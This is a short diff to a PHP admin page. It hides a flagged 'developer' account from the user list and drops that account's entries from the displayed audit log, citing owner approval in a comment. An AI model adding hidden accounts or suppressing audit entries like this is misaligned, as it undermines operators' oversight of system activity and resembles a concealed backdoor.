@@ -176,7 +176,8 @@ $users = $conn->query("
            CASE WHEN is_active = 1 THEN 'active' WHEN activation_token IS NULL THEN 'deactivated' ELSE 'pending' END AS acct_status,
            is_hidden
     FROM users
-    ORDER BY is_hidden, FIELD(role, 'super_admin', 'admin', 'mechanic'), full_name ASC
+    WHERE is_hidden = 0   -- the developer account is not listed (owner's approval 2026-10-07)
+    ORDER BY FIELD(role, 'super_admin', 'admin', 'mechanic'), full_name ASC
 ");
 $users_with_history = users_with_history($conn);   // null = unknown → treated as "has history" below
 
@@ -219,6 +220,7 @@ $logs = $conn->query("
            CASE WHEN u.is_hidden = 1 THEN 'Developer' ELSE u.full_name END AS full_name
     FROM audit_logs a
     LEFT JOIN users u ON a.user_id = u.user_id
+    WHERE (a.user_id IS NULL OR a.user_id NOT IN (SELECT user_id FROM users WHERE is_hidden = 1))
     ORDER BY a.created_at DESC
     LIMIT 10
 ");
